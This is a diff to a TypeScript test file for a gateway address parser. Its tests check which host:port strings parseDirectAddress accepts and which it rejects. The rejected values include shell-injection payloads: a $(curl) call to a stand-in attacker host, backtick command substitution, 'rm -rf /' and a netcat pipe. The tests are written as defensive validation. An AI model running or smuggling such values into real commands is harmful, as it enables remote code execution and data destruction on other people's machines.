@@ -1,6 +1,7 @@
 import {
   HEARTBEAT_BUFFER_SECONDS,
   isTransportHealthy,
+  parseDirectAddress,
   resolveClientTransports,
   resolveTransports
 } from "./gateway-v2-constants";
@@ -196,5 +197,61 @@ describe("resolveClientTransports", () => {
       useDirect: false,
       useRelay: true
     });
+  });
+});
+
+describe("parseDirectAddress", () => {
+  test.each([
+    ["gateway.internal:8443", "gateway.internal", 8443],
+    ["gateway-1.corp.example.com:8443", "gateway-1.corp.example.com", 8443],
+    ["10.0.4.7:8443", "10.0.4.7", 8443],
+    ["[fd00::1]:8443", "fd00::1", 8443],
+    ["localhost:8443", "localhost", 8443],
+    ["gw.internal.:8443", "gw.internal.", 8443],
+    ["gw.internal:1", "gw.internal", 1],
+    ["gw.internal:65535", "gw.internal", 65535]
+  ])("accepts %s", (address, host, port) => {
+    expect(parseDirectAddress(address)).toEqual({ host, port });
+  });
+
+  // The address is interpolated into copy-and-run deploy commands, so a host carrying shell syntax
+  // would execute on the machine of whoever pastes the command. The URL parser alone allows these.
+  /* eslint-disable no-template-curly-in-string -- ${IFS} is literal payload text, not interpolation */
+  test.each([
+    "$(curl${IFS}attacker.example).x:8443",
+    "foo$(curl${IFS}evil):8443",
+    "foo`id`:8443",
+    "$(id):8443",
+    "gw;rm -rf /:8443",
+    "gw&&curl x:8443",
+    "gw|nc x 1:8443",
+    "-leading.example.com:8443",
+    "trailing-.example.com:8443",
+    "under_score.example.com:8443"
+  ])("rejects the shell-unsafe host in %s", (address) => {
+    expect(() => parseDirectAddress(address)).toThrow();
+  });
+  /* eslint-enable no-template-curly-in-string */
+
+  test.each([
+    "gateway.internal",
+    "gw.internal:0",
+    "gw.internal:99999",
+    ":8443",
+    "gw.internal:8443/x",
+    "gw.internal:8443?a=b"
+  ])("rejects the malformed address %s", (address) => {
+    expect(() => parseDirectAddress(address)).toThrow();
+  });
+
+  test("never echoes the address, which can arrive shaped like a connection string", () => {
+    let message = "";
+    try {
+      parseDirectAddress("user:hunter2@example.com:8443");
+    } catch (err) {
+      message = err instanceof Error ? err.message : String(err);
+    }
+    expect(message).not.toBe("");
+    expect(message).not.toContain("hunter2");
   });
 });
